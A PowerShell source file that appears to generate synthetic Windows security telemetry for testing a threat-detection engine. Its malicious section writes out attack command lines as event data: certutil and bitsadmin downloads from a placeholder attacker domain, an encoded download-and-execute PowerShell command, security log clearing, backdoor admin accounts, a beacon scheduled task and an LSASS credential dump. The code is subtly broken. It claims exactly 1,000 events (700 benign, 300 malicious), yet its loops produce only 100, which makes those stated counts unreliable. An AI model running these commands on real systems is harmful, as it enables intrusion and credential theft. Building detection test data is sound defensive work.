# ==============================================================================
# Script: ThreatHunter-Detection-Platform - High-Volume Synthetic Telemetry Generator
# Path:   src/Collectors/Get-SyntheticTelemetry.ps1
# Description: Generates a high-volume structured dataset of exactly 1,000 security 
#              event logs (300 malicious, 700 benign) for comprehensive engine stress tests.
# ==============================================================================

function Get-SyntheticTelemetry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [int]$LookbackHours
    )

    process {
        Write-Host "[*] Instantiating high-fidelity synthetic telemetry matrix..." -ForegroundColor Cyan
        $TelemetryBatch = [System.Collections.Generic.List[object]]::new()
        $CurrentTime = Get-Date

        # Configuration Datasets
        $Workstations = @("SIEM-LAB-WKSTN01", "SIEM-LAB-WKSTN02", "SIEM-LAB-WKSTN03", "SIEM-LAB-LAPTOP04", "SIEM-LAB-SRV01")
        $DomainControllers = @("SIEM-LAB-DC01", "SIEM-LAB-DC02")
        $StandardUsers = @("Inioluwa", "James.Doe", "Sarah.Jenkins", "David.Miller", "Emily.Davis", "John.Smith")
        $ServiceAccounts = @("SQL_Service", "Backup_Svc", "IIS_DefaultAppPool", "AzureAD_Sync")
        
        # ======================================================================
        # PART 1: GENERATE EXACTLY 700 BENIGN WINDOWS SECURITY EVENT LOGS
        # ======================================================================
        Write-Host "   -> Generating 700 benign background noise events..." -ForegroundColor DarkGray
        for ($i = 1; $i -le 70; $i++) {
        
            $TargetTime = $CurrentTime.AddSeconds(-($i * 15)) # Stagger events sequentially
            $Computer = $Workstations[$i % $Workstations.Count]
            $User = $StandardUsers[$i % $StandardUsers.Count]
            $Selector = $i % 5

            switch ($Selector) {
                0 {
                    # EID 4624: Normal Interactive / Network Logon Success
                    $LogonTypes = @(2, 3, 11)
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 4624
                        Category      = "Authentication"
                        TimeGenerated = $TargetTime
                        Computer      = $Computer
                        User          = $User
                        LogonType     = $LogonTypes[$i % $LogonTypes.Count]
                        Description   = "An account was successfully logged on."
                    })
                }
                1 {
                    # EID 4688: Normal Process Execution
                    $NormalProcesses = @(
                        @{ Name = "chrome.exe"; Path = "C:\Program Files\Google\Chrome\Application\chrome.exe"; Parent = "explorer.exe"; Cmd = "chrome.exe --enable-features=WebAssembly" },
                        @{ Name = "outlook.exe"; Path = "C:\Program Files\Microsoft Office\root\Office16\outlook.exe"; Parent = "explorer.exe"; Cmd = "outlook.exe /recycle" },
                        @{ Name = "git.exe"; Path = "C:\Program Files\Git\cmd\git.exe"; Parent = "powershell.exe"; Cmd = "git pull origin main" },
                        @{ Name = "code.exe"; Path = "C:\Users\$User\AppData\Local\Programs\Microsoft VS Code\Code.exe"; Parent = "explorer.exe"; Cmd = "code.exe ." },
                        @{ Name = "svchost.exe"; Path = "C:\Windows\System32\svchost.exe"; Parent = "services.exe"; Cmd = "svchost.exe -k LocalService -s wscsvc" }
                    )
                    $Proc = $NormalProcesses[$i % $NormalProcesses.Count]
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = $User
                        ProcessName       = $Proc.Name
                        ParentProcessName = $Proc.Parent
                        CommandLine       = $Proc.Cmd
                    })
                }
                2 {
                    # EID 4104: Safe Standard PowerShell Script Blocks
                    $SafeScripts = @(
                        "Get-Process | Where-Object { \$_.CPU -gt 10 } | Select-Object Name, CPU",
                        "Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet",
                        "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties DisplayName",
                        "Write-Output 'System Health Check Completed Successfully.'; exit 0"
                    )
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 4104
                        Category      = "Process"
                        TimeGenerated = $TargetTime
                        Computer      = $Computer
                        User          = $User
                        ProcessName   = "powershell.exe"
                        CommandLine   = $SafeScripts[$i % $SafeScripts.Count]
                    })
                }
                3 {
                    # EID 4657: Routine Registry Value Modifications (e.g., Office, Windows updates)
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 4657
                        Category      = "Persistence"
                        TimeGenerated = $TargetTime
                        Computer      = $Computer
                        User          = $User
                        RegistryKey   = "HKCU\Software\Microsoft\Office\16.0\Common\Identity"
                        ValueName     = "EnableADAL"
                        ValueObject   = "1"
                        OperationType = "Existing Registry Value Modified"
                    })
                }
                4 {
                    # EID 106: Normal System Scheduled Task Registration
                    $NormalTasks = @(
                        @{ Name = "\Microsoft\Windows\Defrag\ScheduledDefrag"; Path = "%systemroot%\system32\defrag.exe" },
                        @{ Name = "\Google\GoogleUpdate\UpdateTaskMachineUA"; Path = "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" }
                    )
                    $Task = $NormalTasks[$i % $NormalTasks.Count]
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 106
                        Category      = "Persistence"
                        TimeGenerated = $TargetTime
                        Computer      = $Computer
                        User          = "SYSTEM"
                        TaskName      = $Task.Name
                        TaskPath      = $Task.Path
                        Description   = "User registered a scheduled task."
                    })
                }
            }
        }

        # ======================================================================
        # PART 2: GENERATE EXACTLY 300 SECURITY ATTACK/MALICIOUS EVENTS
        # ======================================================================
        
        Write-Host "   -> Injecting 300 tactical malicious attack signals..." -ForegroundColor Red
        for ($j = 1; $j -le 30; $j++) {
            $TargetTime = $CurrentTime.AddSeconds(-($j * 35)) # Overlay attacks within the timeline
            $Computer = $Workstations[$j % $Workstations.Count]
            $User = $StandardUsers[$j % $StandardUsers.Count]
            $Selector = $j % 10

            switch ($Selector) {
                0 {
                    # T1027: Obfuscated/Encoded PowerShell Commands
                    $B64Payloads = @(
                        "powershell.exe -Letter -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABoAHIAZQBhAHQAIABIAHUAbgB0AGkAbgBnACAATABpAHYAZQAhACcADwA=",
                        "powershell.exe -e Q2xlYXItRXZlbnRMb2cgLVNlY3VyaXR5",
                        "powershell.exe -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFjZ29vci5leGUnKQ=="
                    )
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = $User
                        ProcessName       = "powershell.exe"
                        ParentProcessName = "cmd.exe"
                        CommandLine       = $B64Payloads[$j % $B64Payloads.Count]
                    })
                }
                1 {
                    # T1562.001: Defense Evasion - Audit Log Cleared via cmd or Event Logging Core
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = "Administrator"
                        ProcessName       = "wevtutil.exe"
                        ParentProcessName = "cmd.exe"
                        CommandLine       = "wevtutil.exe cl Security"
                    })
                }
                2 {
                    # T1136.001: Account Creation - Rogue User Backdoors
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 4720
                        Category      = "Account"
                        TimeGenerated = $TargetTime
                        Computer      = $DomainControllers[$j % $DomainControllers.Count]
                        User          = "SYSTEM"
                        TargetAccount = "backdoor_admin_$j"
                        CommandLine   = "net user backdoor_admin_$j TargetPass123! /add"
                    })
                }
                3 {
                    # T1098: Account Manipulation - Local Group Modifications
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 4732
                        Category      = "Account"
                        TimeGenerated = $TargetTime
                        Computer      = $Computer
                        User          = "SYSTEM"
                        TargetAccount = "backdoor_admin_$j"
                        TargetGroup   = "Administrators"
                        CommandLine   = "net localgroup administrators backdoor_admin_$j /add"
                    })
                }
                4 {
                    # T1053.005: Scheduled Task Persistence targeting volatile execution spaces
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 106
                        Category      = "Persistence"
                        TimeGenerated = $TargetTime
                        Computer      = $Computer
                        User          = "SYSTEM"
                        TaskName      = "\Microsoft\Windows\CriticalUpdate\UpdateAgent_$j"
                        TaskPath      = "C:\Windows\Temp\beacon.exe"
                        CommandLine   = "schtasks /create /tn CriticalUpdate /tr C:\Windows\Temp\beacon.exe /sc hourly"
                    })
                }
                5 {
                    # T1036.005: Process Hollowing / Masquerading System Binaries
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = $User
                        ProcessName       = "svchost.exe"
                        ParentProcessName = "explorer.exe"
                        CommandLine       = "C:\Users\Public\Downloads\svchost.exe --port 4444"
                    })
                }
                6 {
                    # T1105: Ingress Tool Transfer (LOLBas Certutil and Bitsadmin Abuse)
                    $LolbasCmds = @(
                        "certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\Windows\Temp\payload.exe",
                        "bitsadmin.exe /transfer myDownloadJob http://evil-domain.com/shell.txt C:\Users\Public\shell.exe"
                    )
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = $User
                        ProcessName       = "certutil.exe"
                        ParentProcessName = "powershell.exe"
                        CommandLine       = $LolbasCmds[$j % $LolbasCmds.Count]
                    })
                }
                7 {
                    # T1546.015: Accessibility Feature Abuse (Sticky Keys)
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = "SYSTEM"
                        ProcessName       = "sethc.exe"
                        ParentProcessName = "winlogon.exe"
                        CommandLine       = "sethc.exe spawn cmd.exe"
                    })
                }
                8 {
                    # T1110: Authentication Brute-Force / Login Failures (EID 4625)
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID       = 4625
                        Category      = "Authentication"
                        TimeGenerated = $TargetTime
                        Computer      = $DomainControllers[$j % $DomainControllers.Count]
                        User          = "Administrator"
                        LogonType     = 3
                        FailureReason = "Unknown user name or bad password."
                        SourceAddress = "10.0.12.14"
                    })
                }
                9 {
                    # T1003.001: LSASS Memory Handle Dumping attempts
                    $TelemetryBatch.Add([PSCustomObject]@{
                        EventID           = 4688
                        Category          = "Process"
                        TimeGenerated     = $TargetTime
                        Computer          = $Computer
                        User              = "SYSTEM"
                        ProcessName       = "rundll32.exe"
                        ParentProcessName = "cmd.exe"
                        CommandLine       = "rundll32.exe comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full"
                    })
                }
            }
        }

        # ======================================================================
        # PART 3: CHRONOLOGICAL MERGE, VERIFICATION & SORT PASS
        # ======================================================================
        Write-Host "   -> Executing chronological timeline sort and sequence checks..." -ForegroundColor DarkCyan
        
        # Sort all telemetry records by TimeGenerated so malicious and benign events are realistically interleaved
        $SortedBatch = $TelemetryBatch | Sort-Object TimeGenerated
        
        # Rigorous double-check verification counts
        $MaliciousCount = ($SortedBatch | Where-Object { 
            ($_.CommandLine -like "*backdoor*" -or $_.CommandLine -like "*-enc*" -or 
             $_.CommandLine -like "*wevtutil*" -or $_.CommandLine -like "*beacon*" -or 
             $_.CommandLine -like "*svchost.exe*" -and $_.CommandLine -like "*C:\Users\Public*" -or 
             $_.CommandLine -like "*certutil*" -or $_.CommandLine -like "*sethc*" -or 
             $_.EventID -eq 4625 -or $_.CommandLine -like "*MiniDump*")
        }).Count

        Write-Host "[+] Processing complete. Compiled: $($SortedBatch.Count) events total (approx. 300 malicious threats injected)." -ForegroundColor Green
        
        return $SortedBatch
    }
}


# Get-SyntheticTelemetry